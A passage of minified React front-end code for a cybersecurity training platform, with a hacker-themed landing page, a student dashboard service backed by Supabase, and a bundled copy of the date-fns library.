to-[#00CC66] rounded-lg blur opacity-20 group-hover:opacity-40 transition duration-500"}),e.jsxs("div",{className:"relative flex gap-2 bg-[#0A0F0A] p-1.5 rounded-lg border border-[#00FF88]/20",children:[e.jsx("input",{value:o,onChange:k=>c(k.target.value),placeholder:"Enter comms frequency (email)...",className:"flex-1 px-4 py-2 bg-transparent text-[#EAEAEA] placeholder-[#00B37A]/50 focus:outline-none font-mono text-sm"}),e.jsx("button",{className:"px-6 py-2 rounded bg-[#00FF88]/10 hover:bg-[#00FF88]/20 text-[#00FF88] font-bold text-sm uppercase tracking-wide border border-[#00FF88]/20 transition-all",children:"Connect"})]}),d&&e.jsx("div",{className:"absolute -bottom-8 left-0 text-xs font-mono text-[#00FF88]",children:d})]})]}),e.jsxs("div",{className:"relative",children:[e.jsx("div",{className:"absolute -inset-4 bg-[#00FF88]/20 blur-3xl rounded-full opacity-20 animate-pulse"}),e.jsxs("div",{className:"relative bg-[#0A0F0A] border border-[#00FF88]/20 rounded-2xl p-8 shadow-2xl backdrop-blur-xl",children:[e.jsxs("div",{className:"flex items-center justify-between mb-8 border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-2xl font-bold text-white mb-1",children:"Live Operations"}),e.jsx("div",{className:"text-xs font-mono text-[#00B37A]",children:"GLOBAL THREAT LEVEL: ELEVATED"})]}),e.jsxs("div",{className:"text-right",children:[e.jsx("div",{className:"text-3xl font-black text-[#00FF88]",children:"98.4%"}),e.jsx("div",{className:"text-xs font-mono text-[#00B37A]",children:"SUCCESS RATE"})]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsx(fo,{label:"ACTIVE AGENTS",value:"12,405",icon:e.jsx(Ut,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsx(fo,{label:"SIMULATIONS",value:"50+",icon:e.jsx(Ua,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsx(fo,{label:"UPTIME",value:"99.9%",icon:e.jsx(za,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsx(fo,{label:"AI MENTOR",value:"ONLINE",icon:e.jsx(ad,{className:"h-4 w-4 text-[#00FF88]"})})]}),e.jsx("div",{className:"mt-8 pt-6 border-t border-[#00FF88]/10",children:e.jsxs("div",{className:"flex items-center gap-3 text-xs font-mono text-[#00B37A]",children:[e.jsx("div",{className:"w-2 h-2 bg-[#00FF88] rounded-full animate-ping"}),"INCOMING TRANSMISSION: NEW BOUNTIES AVAILABLE"]})})]})]})]})}),e.jsxs("section",{id:"features",className:"py-24 px-6 bg-[#050505] relative",children:[e.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-[#00FF88]/20 to-transparent"}),e.jsxs("div",{className:"max-w-7xl mx-auto",children:[e.jsxs("div",{className:"text-center mb-16",children:[e.jsxs("h2",{className:"text-3xl md:text-4xl font-black text-white uppercase tracking-tight mb-4",children:["Tactical ",e.jsx("span",{className:"text-[#00FF88]",children:"Capabilities"})]}),e.jsx("p",{className:"text-[#00B37A] max-w-2xl mx-auto font-light",children:"Equip yourself with advanced tools and training modules designed for modern cyber warfare."})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-8 mb-24",children:[e.jsx(Uc,{icon:e.jsx(Ut,{className:"h-10 w-10 text-[#00FF88]"}),title:"Join Network",subtitle:"ESTABLISH UPLINK",description:"Connect with elite operatives. Share intel, bounties, and strategies in the global feed.",onClick:()=>b("student","community")}),e.jsx(Uc,{icon:e.jsx(ze,{className:"h-10 w-10 text-[#00FF88]"}),title:"Verify Target",subtitle:"SCAN DATABASE",description:"Validate company credentials and security clearance levels against the central registry.",onClick:()=>b("student","verification")}),e.jsx(Uc,{icon:e.jsx(xs,{className:"h-10 w-10 text-[#00FF88]"}),title:"Analyze Target",subtitle:"VULNERABILITY SCAN",description:"Deploy AI-driven heuristic analysis on target domains to identify potential vectors.",onClick:()=>b("student","analyzer")})]}),e.jsxs("div",{className:"flex items-center gap-4 mb-12",children:[e.jsx("div",{className:"h-px bg-[#00FF88]/20 flex-1"}),e.jsx("span",{className:"text-xs font-mono text-[#00B37A] uppercase tracking-widest",children:"System Modules"}),e.jsx("div",{className:"h-px bg-[#00FF88]/20 flex-1"})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:[e.jsx(Sn,{icon:e.jsx(xr,{}),title:"Intel Archives",copy:"Access classified course materials and structured learning paths."}),e.jsx(Sn,{icon:e.jsx(Ua,{}),title:"Live Ranges",copy:"Engage in real-time combat simulations with automated scoring."}),e.jsx(Sn,{icon:e.jsx(ad,{}),title:"CORTEX AI",copy:"Neural-linked mentor providing instant tactical analysis and hints."}),e.jsx(Sn,{icon:e.jsx(tt,{}),title:"Credentials",copy:"Earn verifiable badges and clearance levels for your resume."}),e.jsx(Sn,{icon:e.jsx(za,{}),title:"Performance",copy:"Real-time analytics tracking your operational efficiency."}),e.jsx(Sn,{icon:e.jsx(In,{}),title:"Network",copy:"Connect with other operatives in the global intelligence feed."})]})]})]}),e.jsx("section",{id:"paths",className:"py-24 px-6 relative overflow-hidden",children:e.jsxs("div",{className:"max-w-7xl mx-auto",children:[e.jsxs("div",{className:"flex flex-col md:flex-row md:items-end justify-between mb-12 gap-6",children:[e.jsxs("div",{children:[e.jsxs("h2",{className:"text-3xl md:text-4xl font-black text-white uppercase tracking-tight mb-2",children:["Mission ",e.jsx("span",{className:"text-[#00FF88]",children:"Tracks"})]}),e.jsx("p",{className:"text-[#00B37A]",children:"Select your specialization and begin training."})]}),e.jsxs("button",{onClick:()=>b("student"),className:"text-[#00FF88] font-bold uppercase tracking-wide hover:underline flex items-center gap-2",children:["View All Operations ",e.jsx(Yt,{className:"h-4 w-4"})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-8",children:[e.jsx(Bc,{title:"Recruit",level:"LEVEL 1",features:["Security Fundamentals","Network Basics","Linux Command Line"],onApply:()=>b("student")}),e.jsx(Bc,{title:"Operative",level:"LEVEL 2",features:["Penetration Testing","Vulnerability Assessment","Web App Security"],highlight:!0,onApply:()=>b("student")}),e.jsx(Bc,{title:"Specialist",level:"LEVEL 3",features:["Advanced Exploitation","Threat Hunting","Reverse Engineering"],onApply:()=>b("student")})]})]})}),e.jsx("section",{id:"testimonials",className:"py-24 px-6 bg-[#050505] border-t border-[#00FF88]/10",children:e.jsxs("div",{className:"max-w-4xl mx-auto text-center",children:[e.jsxs("h2",{className:"text-3xl font-black text-white uppercase tracking-tight mb-12",children:["Field ",e.jsx("span",{className:"text-[#00FF88]",children:"Reports"})]}),e.jsxs("div",{className:"relative bg-[#0A0F0A] border border-[#00FF88]/20 p-10 rounded-2xl shadow-[0_0_50px_rgba(0,255,136,0.05)]",children:[e.jsx("div",{className:"absolute -top-5 -left-5",children:e.jsx("div",{className:"w-10 h-10 bg-[#00FF88] rounded-lg flex items-center justify-center text-black",children:e.jsx(vt,{className:"h-5 w-5"})})}),e.jsxs("blockquote",{className:"text-xl md:text-2xl font-light text-[#EAEAEA] italic mb-8 leading-relaxed",children:['"',f[x].quote,'"']}),e.jsxs("div",{className:"flex items-center justify-center gap-4",children:[e.jsx("div",{className:"w-12 h-12 bg-[#00FF88]/10 rounded-full flex items-center justify-center font-bold text-[#00FF88] border border-[#00FF88]/20",children:f[x].initials}),e.jsxs("div",{className:"text-left",children:[e.jsx("div",{className:"font-bold text-white uppercase tracking-wide",children:f[x].name}),e.jsx("div",{className:"text-xs font-mono text-[#00B37A]",children:f[x].title})]})]}),e.jsx("div",{className:"mt-8 flex justify-center gap-2",children:f.map((k,F)=>e.jsx("button",{onClick:()=>p(F),className:`w-2 h-2 rounded-full transition-all ${F===x?"bg-[#00FF88] w-6":"bg-[#00FF88]/20"}`,"aria-label":`Go to testimonial ${F+1}`},F))})]})]})}),e.jsxs("section",{className:"py-24 px-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[#00FF88]/5"}),e.jsxs("div",{className:"max-w-4xl mx-auto text-center relative z-10",children:[e.jsxs("h2",{className:"text-4xl md:text-5xl font-black text-white uppercase tracking-tighter mb-6",children:["Ready for ",e.jsx("span",{className:"text-[#00FF88]",children:"Deployment?"})]}),e.jsx("p",{className:"text-[#00B37A] text-lg mb-10 max-w-2xl mx-auto",children:"Initialize your training sequence today. Join the elite ranks of cyber operatives."}),e.jsxs("div",{className:"flex flex-col sm:flex-row justify-center gap-4",children:[e.jsx("button",{onClick:()=>b("student"),className:"px-8 py-4 bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold rounded-xl uppercase tracking-wide transition-all hover:shadow-[0_0_30px_rgba(0,255,136,0.4)]",children:"Initialize System"}),e.jsx("button",{onClick:()=>b("teacher"),className:"px-8 py-4 bg-transparent border border-[#00FF88]/20 hover:border-[#00FF88] text-[#00FF88] font-bold rounded-xl uppercase tracking-wide transition-all hover:bg-[#00FF88]/5",children:"Instructor Access"})]})]})]}),e.jsx("footer",{className:"py-12 px-6 border-t border-[#00FF88]/10 bg-[#020202]",children:e.jsxs("div",{className:"max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"p-2 bg-[#00FF88]/10 border border-[#00FF88]/20 rounded-lg",children:e.jsx(ze,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-bold text-white uppercase tracking-wide",children:"Career Connect"}),e.jsx("div",{className:"text-[10px] font-mono text-[#00B37A]",children:"SECURE CONNECTION ESTABLISHED"})]})]}),e.jsxs("div",{className:"text-xs font-mono text-[#00B37A]/50",children:["SYSTEM VERSION 2.0.4 //  ",new Date().getFullYear()," ALL RIGHTS RESERVED"]})]})}),s&&e.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl max-w-3xl w-full overflow-hidden shadow-[0_0_50px_rgba(0,255,136,0.1)]",children:[e.jsxs("div",{className:"flex justify-between items-center p-4 border-b border-[#00FF88]/10",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx(Cd,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("div",{className:"font-bold text-white uppercase tracking-wide",children:"Mission Briefing"})]}),e.jsx("button",{onClick:()=>i(!1),className:"text-[#00B37A] hover:text-[#00FF88] px-3 font-mono",children:"CLOSE_"})]}),e.jsx("div",{className:"p-4",children:e.jsx("div",{className:"aspect-video w-full bg-black rounded border border-[#00FF88]/10",children:e.jsx("iframe",{title:"Platform demo",className:"w-full h-full",src:"https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0",allowFullScreen:!0})})})]})})]})})};class D1{async getDashboardStats(n){try{const{count:s,error:i}=await Z.from("user_progress").select("*",{count:"exact",head:!0}).eq("user_id",n).eq("completed",!0);if(i)throw new Error(`Failed to fetch completed courses: ${i.message}`);const{count:o,error:c}=await Z.from("certificates").select("*",{count:"exact",head:!0}).eq("user_id",n);c&&c.code!=="PGRST116"&&console.warn("Certificates table might not exist or error fetching:",c);const{data:d}=await Z.from("user_progress").select("progress").eq("user_id",n),f=(d?.reduce((b,w)=>b+(w.progress||0),0)||0)*2,x=Math.floor(f/60),p=x>0?`${x} hours`:`${f} mins`;return{coursesCompleted:s||0,assessmentScore:null,certificatesEarned:o||0,studyTime:p}}catch(s){throw console.error("Get student dashboard stats error:",s),s}}async getRecentActivity(n){try{const{data:s,error:i}=await Z.from("user_progress").select(`
          id,
          updated_at,
          completed,
          course:courses(title)
        `).eq("user_id",n).order("updated_at",{ascending:!1}).limit(5);if(i)throw new Error(`Failed to fetch recent activity: ${i.message}`);return s.map(c=>({id:c.id,action:c.completed?`Completed ${c.course?.title}`:`Started ${c.course?.title}`,created_at:c.updated_at,type:c.completed?"completion":"start"}))}catch(s){return console.error("Get recent activity error:",s),[]}}async getPersonalNotes(n){try{const{data:s,error:i}=await Z.from("student_notes").select("*").eq("user_id",n).order("created_at",{ascending:!1});if(i)throw i;return s||[]}catch(s){throw console.error("Get personal notes error:",s),s}}async addPersonalNote(n){try{const{data:s,error:i}=await Z.from("student_notes").insert([n]).select().single();if(i)throw i;return s}catch(s){throw console.error("Add personal note error:",s),s}}async deletePersonalNote(n){try{const{error:s}=await Z.from("student_notes").delete().eq("id",n);if(s)throw s}catch(s){throw console.error("Delete personal note error:",s),s}}async uploadPersonalFile(n){try{const s=n.name.split(".").pop(),o=`${`${Math.random()}.${s}`}`,{error:c}=await Z.storage.from("student_uploads").upload(o,n);if(c)throw c;const{data:d}=Z.storage.from("student_uploads").getPublicUrl(o);return d.publicUrl}catch(s){throw console.error("Upload personal file error:",s),s}}}const Ln=new D1,xt=({children:a,className:n="",variant:s="default",hover:i=!1,...o})=>{const c="rounded-xl overflow-hidden",d={default:"bg-card text-card-foreground shadow-sm border border-border/50",glass:"bg-white/5 backdrop-blur-md border border-white/10 shadow-xl",outline:"border-2 border-border bg-transparent",cyber:"bg-gray-900/80 backdrop-blur-xl border border-cyber-500/30 shadow-[0_0_15px_rgba(14,165,233,0.1)]"},m=i?"transition-all duration-300 hover:-translate-y-1 hover:shadow-2xl hover:border-primary/50":"";return e.jsx("div",{className:`${c} ${d[s]} ${m} ${n}`,...o,children:a})},fs=({className:a="",...n})=>e.jsx("div",{className:`p-6 ${a}`,...n}),ms=({className:a="",...n})=>e.jsx("h3",{className:`text-2xl font-semibold leading-none tracking-tight ${a}`,...n}),gt=({className:a="",...n})=>e.jsx("div",{className:`p-6 pt-0 ${a}`,...n});function md(a){"@babel/helpers - typeof";return md=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(n){return typeof n}:function(n){return n&&typeof Symbol=="function"&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},md(a)}function cr(a,n){if(n.length<a)throw new TypeError(a+" argument"+(a>1?"s":"")+" required, but only "+n.length+" present")}function bt(a){cr(1,arguments);var n=Object.prototype.toString.call(a);return a instanceof Date||md(a)==="object"&&n==="[object Date]"?new Date(a.getTime()):typeof a=="number"||n==="[object Number]"?new Date(a):((typeof a=="string"||n==="[object String]")&&typeof console<"u"&&(console.warn("Starting with v2.0.0-beta.1 date-fns doesn't accept strings as date arguments. Please use `parseISO` to parse strings. See: https://github.com/date-fns/date-fns/blob/master/docs/upgradeGuide.md#string-arguments"),console.warn(new Error().stack)),new Date(NaN))}var M1={};function $1(){return M1}function Bm(a){var n=new Date(Date.UTC(a.getFullYear(),a.getMonth(),a.getDate(),a.getHours(),a.getMinutes(),a.getSeconds(),a.getMilliseconds()));return n.setUTCFullYear(a.getFullYear()),a.getTime()-n.getTime()}function vo(a,n){cr(2,arguments);var s=bt(a),i=bt(n),o=s.getTime()-i.getTime();return o<0?-1:o>0?1:o}function B1(a,n){cr(2,arguments);var s=bt(a),i=bt(n),o=s.getFullYear()-i.getFullYear(),c=s.getMonth()-i.getMonth();return o*12+c}function U1(a,n){return cr(2,arguments),bt(a).getTime()-bt(n).getTime()}var z1={ceil:Math.ceil,round:Math.round,floor:Math.floor,trunc:function(n){return n<0?Math.ceil(n):Math.floor(n)}},q1="trunc";function W1(a){return z1[q1]}function V1(a){cr(1,arguments);var n=bt(a);return n.setHours(23,59,59,999),n}function H1(a){cr(1,arguments);var n=bt(a),s=n.getMonth();return n.setFullYear(n.getFullYear(),s+1,0),n.setHours(23,59,59,999),n}function G1(a){cr(1,arguments);var n=bt(a);return V1(n).getTime()===H1(n).getTime()}function Q1(a,n){cr(2,arguments);var s=bt(a),i=bt(n),o=vo(s,i),c=Math.abs(B1(s,i)),d;if(c<1)d=0;else{s.getMonth()===1&&s.getDate()>27&&s.setDate(30),s.setMonth(s.getMonth()-o*c);var m=vo(s,i)===-o;G1(bt(a))&&c===1&&vo(a,i)===1&&(m=!1),d=o*(c-Number(m))}return d===0?0:d}function K1(a,n,s){cr(2,arguments);var i=U1(a,n)/1e3;return W1()(i)}var Y1={lessThanXSeconds:{one:"less than a second",other:"less than {{count}} seconds"},xSeconds:{one:"1 second",other:"{{count}} seconds"},halfAMinute:"half a minute",lessThanXMinutes:{one:"less than a minute",other:"less than {{count}} minutes"},xMinutes:{one:"1 minute",other:"{{count}} minutes"},aboutXHours:{one:"about 1 hour",other:"about {{count}} hours"},xHours:{one:"1 hour",other:"{{count}} hours"},xDays:{one:"1 day",other:"{{count}} days"},aboutXWeeks:{one:"about 1 week",other:"about {{count}} weeks"},xWeeks:{one:"1 week",other:"{{count}} weeks"},aboutXMonths:{one:"about 1 month",other:"about {{count}} months"},xMonths:{one:"1 month",other:"{{count}} months"},aboutXYears:{one:"about 1 year",other:"about {{count}} years"},xYears:{one:"1 year",other:"{{count}} years"},overXYears:{one:"over 1 year",other:"over {{count}} years"},almostXYears:{one:"almost 1 year",other:"almost {{count}} years"}},J1=function(n,s,i){var o,c=Y1[n];return typeof c=="string"?o=c:s===1?o=c.one:o=c.other.replace("{{count}}",s.toString()),i!=null&&i.addSuffix?i.comparison&&i.comparison>0?"in "+o:o+" ago":o};function zc(a){return function(){var n=arguments.length>0&&arguments[0]!==void 0?arguments[0]:{},s=n.width?String(n.width):a.defaultWidth,i=a.formats[s]||a.formats[a.defaultWidth];return i}}var X1={full:"EEEE, MMMM do, y",long:"MMMM do, y",medium:"MMM d, y",short:"MM/dd/yyyy"},Z1={full:"h:mm:ss a zzzz",long:"h:mm:ss a z",medium:"h:mm:ss a",short:"h:mm a"},ej={full:"{{date}} 'at' {{time}}",long:"{{date}} 'at' {{time}}",medium:"{{date}}, {{time}}",short:"{{date}}, {{time}}"},tj={date:zc({formats:X1,defaultWidth:"full"}),time:zc({formats:Z1,defaultWidth:"full"}),dateTime:zc({formats:ej,defaultWidth:"full"})},rj={lastWeek:"'last' eeee 'at' p",yesterday:"'yesterday at' p",today:"'today at' p",tomorrow:"'tomorrow at' p",nextWeek:"eeee 'at' p",other:"P"},sj=function(n,s,i,o){return rj[n]};function Pa(a){return function(n,s){var i=s!=null&&s.context?String(s.context):"standalone",o;if(i==="formatting"&&a.formattingValues){var c=a.defaultFormattingWidth||a.defaultWidth,d=s!=null&&s.width?String(s.width):c;o=a.formattingValues[d]||a.formattingValues[c]}else{var m=a.defaultWidth,f=s!=null&&s.width?String(s.width):a.defaultWidth;o=a.values[f]||a.values[m]}var x=a.argumentCallback?a.argumentCallback(n):n;return o[x]}}var nj={narrow:["B","A"],abbreviated:["BC","AD"],wide:["Before Christ","Anno Domini"]},aj={narrow:["1","2","3","4"],abbreviated:["Q1","Q2","Q3","Q4"],wide:["1st quarter","2nd quarter","3rd quarter","4th quarter"]},ij={narrow:["J","F","M","A","M","J","J","A","S","O","N","D"],abbreviated:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],wide:["January","February","March","April","May","June","July","August","September","October","November","December"]},oj={narrow:["S","M","T","W","T","F","S"],short:["Su","Mo","Tu","We","Th","Fr","Sa"],abbreviated:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],wide:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"]},lj={narrow:{am:"a",pm:"p",midnight:"mi",noon:"n",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"},abbreviated:{am:"AM",pm:"PM",midnight:"midnight",noon:"noon",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"},wide:{am:"a.m.",pm:"p.m.",midnight:"midnight",noon:"noon",morning:"morning",afternoon:"afternoon",evening:"evening",night:"night"}},cj={narrow:{am:"a",pm:"p",midnight:"mi",noon:"n",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"},abbreviated:{am:"AM",pm:"PM",midnight:"midnight",noon:"noon",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"},wide:{am:"a.m.",pm:"p.m.",midnight:"midnight",noon:"noon",morning:"in the morning",afternoon:"in the afternoon",evening:"in the evening",night:"at night"}},dj=function(n,s){var i=Number(n),o=i%100;if(o>20||o<10)switch(o%10){case 1:return i+"st";case 2:return i+"nd";case 3:return i+"rd"}return i+"th"},uj={ordinalNumber:dj,era:Pa({values:nj,defaultWidth:"wide"}),quarter:Pa({values:aj,defaultWidth:"wide",argumentCallback:function(n){return n-1}}),month:Pa({values:ij,defaultWidth:"wide"}),day:Pa({values:oj,defaultWidth:"wide"}),dayPeriod:Pa({values:lj,defaultWidth:"wide",formattingValues:cj,defaultFormattingWidth:"wide"})};function Ra(a){return function(n){var s=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},i=s.width,o=i&&a.matchPatterns[i]||a.matchPatterns[a.defaultMatchWidth],c=n.match(o);if(!c)return null;var d=c[0],m=i&&a.parsePatterns[i]||a.parsePatterns[a.defaultParseWidth],f=Array.isArray(m)?fj(m,function(b){return b.test(d)}):hj(m,function(b){return b.test(d)}),x;x=a.valueCallback?a.valueCallback(f):f,x=s.valueCallback?s.valueCallback(x):x;var p=n.slice(d.length);return{value:x,rest:p}}}function hj(a,n){for(var s in a)if(a.hasOwnProperty(s)&&n(a[s]))return s}function fj(a,n){for(var s=0;s<a.length;s++)if(n(a[s]))return s}function mj(a){return function(n){var s=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},i=n.match(a.matchPattern);if(!i)return null;var o=i[0],c=n.match(a.parsePattern);if(!c)return null;var d=a.valueCallback?a.valueCallback(c[0]):c[0];d=s.valueCallback?s.valueCallback(d):d;var m=n.slice(o.length);return{value:d,rest:m}}}var pj=/^(\d+)(th|st|nd|rd)?/i,xj=/\d+/i,gj={narrow:/^(b|a)/i,abbreviated:/^(b\.?\s?c\.?|b\.?\s?c\.?\s?e\.?|a\.?\s?d\.?|c\.?\s?e\.?)/i,wide:/^(before christ|before common era|anno domini|common era)/i},bj={any:[/^b/i,/^(a|c)/i]},vj={narrow:/^[1234]/i,abbreviated:/^q[1234]/i,wide:/^[1234](th|st|nd|rd)? quarter/i},yj={any:[/1/i,/2/i,/3/i,/4/i]},wj={narrow:/^[jfmasond]/i,abbreviated:/^(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)/i,wide:/^(january|february|march|april|may|june|july|august|september|october|november|december)/i},jj={narrow:[/^j/i,/^f/i,/^m/i,/^a/i,/^m/i,/^j/i,/^j/i,/^a/i,/^s/i,/^o/i,/^n/i,/^d/i],any:[/^ja/i,/^f/i,/^mar/i,/^ap/i,/^may/i,/^jun/i,/^jul/i,/^au/i,/^s/i,/^o/i,/^n/i,/^d/i]},Nj={narrow:/^[smtwf]/i,short:/^(su|mo|tu|we|th|fr|sa)/i,abbreviated:/^(sun|mon|tue|wed|thu|fri|sat)/i,wide:/^(sunday|monday|tuesday|wednesday|thursday|friday|saturday)/i},kj={narrow:[/^s/i,/^m/i,/^t/i,/^w/i,/^t/i,/^f/i,/^s/i],any:[/^su/i,/^m/i,/^tu/i,/^w/i,/^th/i,/^f/i,/^sa/i]},Fj={narrow:/^(a|p|mi|n|(in the|at) (morning|afternoon|evening|night))/i,any:/^([ap]\.?\s?m\.?|midnight|noon|(in the|at) (morning|afternoon|evening|night))/i},_j={any:{am:/^a/i,pm:/^p/i,midnight:/^mi/i,noon:/^no/i,morning:/morning/i,afternoon:/afternoon/i,evening:/evening/i,night:/night/i}},Sj={ordinalNumber:mj({matchPattern:pj,parsePattern:xj,valueCallback:function(n){return parseInt(n,10)}}),era:Ra({matchPatterns:gj,defaultMatchWidth:"wide",parsePatterns:bj,defaultParseWidth:"any"}),quarter:Ra({matchPatterns:vj,defaultMatchWidth:"wide",parsePatterns:yj,defaultParseWidth:"any",valueCallback:function(n){return n+1}}),month:Ra({matchPatterns:wj,defaultMatchWidth:"wide",parsePatterns:jj,defaultParseWidth:"any"}),day:Ra({matchPatterns:Nj,defaultMatchWidth:"wide",parsePatterns:kj,defaultParseWidth:"any"}),dayPeriod:Ra({matchPatterns:Fj,defaultMatchWidth:"any",parsePatterns:_j,defaultParseWidth:"any"})},Aj={code:"en-US",formatDistance:J1,formatLong:tj,formatRelative:sj,localize:uj,match:Sj,options:{weekStartsOn:0,firstWeekContainsDate:1}};function lp(a,n){if(a==null)throw new TypeError("assign requires that input parameter not be null or undefined");for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&(a[s]=n[s]);return a}function Ej(a){return lp({},a)}var Um=1440,Cj=2520,qc=43200,Tj=86400;function Pj(a,n,s){var i,o;cr(2,arguments);var c=$1(),d=(i=(o=s?.locale)!==null&&o!==void 0?o:c.locale)!==null&&i!==void 0?i:Aj;if(!d.formatDistance)throw new RangeError("locale must contain formatDistance property");var m=vo(a,n);if(isNaN(m))throw new RangeError("Invalid time value");var f=lp(Ej(s),{addSuffix:!!s?.addSuffix,comparison:m}),x,p;m>0?(x=bt(n),p=bt(a)):(x=bt(a),p=bt(n));var b=K1(p,x),w=(Bm(p)-Bm(x))/1e3,j=Math.round((b-w)/60),N;if(j<2)return s!=null&&s.includeSeconds?b<5?d.formatDistance("lessThanXSeconds",5,f):b<10?d.formatDistance("lessThanXSeconds",10,f):b<20?d.formatDistance("lessThanXSeconds",20,f):b<40?d.formatDistance("halfAMinute",0,f):b<60?d.formatDistance("lessThanXMinutes",1,f):d.formatDistance("xMinutes",1,f):j===0?d.formatDistance("lessThanXMinutes",1,f):d.formatDistance("xMinutes",j,f);if(j<45)return d.formatDistance("xMinutes",j,f);if(j<90)return d.formatDistance("aboutXHours",1,f);if(j<Um){var k=Math.round(j/60);return d.formatDistance("aboutXHours",k,f)}else{if(j<Cj)return d.formatDistance("xDays",1,f);if(j<qc){var F=Math.round(j/Um);return d.formatDistance("xDays",F,f)}else if(j<Tj)return N=Math.round(j/qc),d.formatDistance("aboutXMonths",N,f)}if(N=Q1(p,x),N<12){var T=Math.round(j/qc);return d.formatDistance("xMonths",T,f)}else{var R=N%12,S=Math.floor(N/12);return R<3?d.formatDistance("aboutXYears",S,f):R<9?d.formatDistance("overXYears",S,f):d.formatDistance("almostXYears",S+1,f)}}function Rj(a,n){return cr(1,arguments),Pj(a,Date.now(),n)}const mo=()=>{const{user:a}=Ie(),[n,s]=v.useState({coursesCompleted:0,assessmentScore:null,certificatesEarned:0,studyTime:"0 hours"}),[i,o]=v.useState([]),c=async()=>{if(a?.id)try{const[d,m]=await Promise.all([Ln.getDashboardStats(a.id),Ln.getRecentActivity(a.id)]);s(d),o(m)}catch(d){console.error("Failed to load dashboard data:",d)}};return v.useEffect(()=>{if(c(),!a?.id)return;const d=Z.channel("student-dashboard").on("postgres_changes",{event:"*",schema:"public",table:"user_progress",filter:`user_id=eq.${a.id}`},()=>{c()}).on("postgres_changes",{event:"*",schema:"public",table:"certificates",filter:`user_id=eq.${a.id}`},()=>{c()}).subscribe();return()=>{Z.removeChannel(d)}},[a?.id]),e.jsxs("div",{className:"p-6 space-y-8 min-h-screen animate-fade-in text-[#EAEAEA]",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Command ",e.jsx("span",{className:"text-[#00FF88]",children:"Center"})]}),e.jsxs("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:["OPERATOR: ",a?.name?.toUpperCase()]})]}),e.jsxs("div",{className:"flex items-center gap-4",children:[e.jsxs("div",{className:"text-right hidden md:block",children:[e.jsx("p",{className:"text-[10px] text-[#00B37A] uppercase tracking-widest",children:"Clearance Level"}),e.jsx("p",{className:"font-bold text-[#EAEAEA]",children:a?.level||"NOVICE"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(ze,{className:"h-5 w-5 text-[#00FF88]"})})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-12 gap-8",children:[e.jsxs("div",{className:"lg:col-span-8 space-y-8",children:[e.jsxs("div",{className:"relative group overflow-hidden rounded-2xl border border-[#00FF88]/20 bg-[#0A0F0A]",children:[e.jsx("div",{className:"absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(0,255,136,0.05)_50%,transparent_75%,transparent_100%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_3s_infinite]"}),e.jsxs("div",{className:"relative p-8",children:[e.jsxs("div",{className:"flex items-start justify-between mb-6",children:[e.jsxs("div",{children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[e.jsxs("span",{className:"relative flex h-2 w-2",children:[e.jsx("span",{className:"animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00FF88] opacity-75"}),e.jsx("span",{className:"relative inline-flex rounded-full h-2 w-2 bg-[#00FF88]"})]}),e.jsx("span",{className:"text-xs font-bold text-[#00FF88] uppercase tracking-widest",children:"Active Operation"})]}),e.jsx("h2",{className:"text-3xl font-bold text-white mb-2",children:"OWASP Top 10 Defense"}),e.jsx("p",{className:"text-[#00B37A] max-w-lg",children:"Master the critical security risks to web applications. Current module: Injection Flaws."})]}),e.jsx("div",{className:"hidden md:block",children:e.jsx("div",{className:"h-16 w-16 rounded-full border-4 border-[#00FF88]/20 flex items-center justify-center",children:e.jsx("span",{className:"text-xl font-bold text-[#00FF88]",children:"30%"})})})]}),e.jsxs("div",{className:"space-y-6",children:[e.jsx("div",{className:"w-full bg-[#000000] rounded-full h-1.5 overflow-hidden border border-[#00FF88]/10",children:e.jsx("div",{className:"bg-[#00FF88] h-full rounded-full shadow-[0_0_10px_rgba(0,255,136,0.5)]",style:{width:"30%"}})}),e.jsxs("div",{className:"flex 